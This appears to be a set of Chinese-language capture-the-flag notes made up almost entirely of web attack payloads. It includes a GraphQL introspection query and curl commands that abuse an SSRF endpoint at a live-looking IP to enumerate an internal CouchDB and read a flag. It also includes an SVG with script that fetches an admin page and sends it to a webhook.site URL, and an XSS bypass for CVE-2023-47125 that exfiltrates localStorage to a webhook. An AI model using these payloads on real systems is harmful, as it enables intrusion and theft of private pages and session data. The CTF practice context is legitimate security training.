GraphQL 查询所有字段

{
"query": "query IntrospectionQuery { __schema { types { name kind description fields { name description args { name description type { name kind ofType { name kind } } } type { name kind ofType { name kind } } } } } }"
}

SSRF利用

#目标端口扫描 couchdb
curl -X POST 'http://94.237.50.221:39660/api/dashboard/endpoints/' -H 'Cookie: token=whale' -H 'Content-Type: application/json' -d "{\"url\":\"[http://127.0.0.1:5984/#\\",\\"sector\\":\\"whale_get_4369\\"}"](http://127.0.0.1:5984/#%5C%5C%22,%5C%5C%22sector%5C%5C%22:%5C%5C%22whale_get_4369%5C%5C%22%7D%22)
curl -X GET 'http://94.237.50.221:39660/api/dashboard/metrics' -H 'Cookie: token=whale'

#couchdb路径 dbs

curl -X POST 'http://94.237.50.221:39660/api/dashboard/endpoints/' -H 'Cookie: token=whale' -H 'Content-Type: application/json' -d "{\"url\":\"[http://127.0.0.1:5984/_all_dbs#\\",\\"sector\\":\\"whale_get_5984_all_dbs\\"}"](http://127.0.0.1:5984/_all_dbs#%5C%5C%22,%5C%5C%22sector%5C%5C%22:%5C%5C%22whale_get_5984_all_dbs%5C%5C%22%7D%22)
curl -X GET 'http://94.237.50.221:39660/api/dashboard/metrics' -H 'Cookie: token=whale'

curl -X POST 'http://94.237.50.221:39660/api/dashboard/endpoints/' -H 'Cookie: token=whale' -H 'Content-Type: application/json' -d "{\"url\":\"[http://127.0.0.1:5984/citismart#\\",\\"sector\\":\\"whale_get_5984_citismart\\"}"](http://127.0.0.1:5984/citismart#%5C%5C%22,%5C%5C%22sector%5C%5C%22:%5C%5C%22whale_get_5984_citismart%5C%5C%22%7D%22)
curl -X GET 'http://94.237.50.221:39660/api/dashboard/metrics' -H 'Cookie: token=whale'
curl -X POST 'http://94.237.50.221:39660/api/dashboard/endpoints/' -H 'Cookie: token=whale' -H 'Content-Type: application/json' -d "{\"url\":\"[http://127.0.0.1:5984/citismart/_all_docs#\\",\\"sector\\":\\"whale_get_5984_citismart_all_docs\\"}"](http://127.0.0.1:5984/citismart/_all_docs#%5C%5C%22,%5C%5C%22sector%5C%5C%22:%5C%5C%22whale_get_5984_citismart_all_docs%5C%5C%22%7D%22)
curl -X GET 'http://94.237.50.221:39660/api/dashboard/metrics' -H 'Cookie: token=whale'
curl -X POST 'http://94.237.50.221:39660/api/dashboard/endpoints/' -H 'Cookie: token=whale' -H 'Content-Type: application/json' -d "{\"url\":\"[http://127.0.0.1:5984/citismart/FLAG#\\",\\"sector\\":\\"whale_get_5984_citismart_FLAG\\"}"](http://127.0.0.1:5984/citismart/FLAG#%5C%5C%22,%5C%5C%22sector%5C%5C%22:%5C%5C%22whale_get_5984_citismart_FLAG%5C%5C%22%7D%22)
curl -X GET 'http://94.237.50.221:39660/api/dashboard/metrics' -H 'Cookie: token=whale' | grep FLAG


上传svg 再构造query让管理员访问，将管理员页面内容反弹回webhook
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
  <script type="text/javascript">
    // Fetch the admin dashboard and exfiltrate via webhook
    fetch('/admin')
      .then(res => res.text())
      .then(html =>
        fetch('https://webhook.site/ac03410c-e005-4aa4-85c8-b0eeadab1367', {
          method: 'POST',
          body: btoa(html)
        })
      );
  </script>
</svg>



DOM存储型XSS
PHP组件：
 "typo3/html-sanitizer": "2.1.3"
 CVE-2023-47125
DOM 处理指令未得到正确处理。这允许绕过 的跨站点脚本机制typo3/html-sanitizer
<?xml s><img src="x" onerror="fetch('https://webhook.site/6dbbdd70-feef-4c04-a328-f5a96a14350c?x='+localStorage.getItem('flag'))">?>
<?xml s><img src="x" onerror="alert('testtesttest')">?>
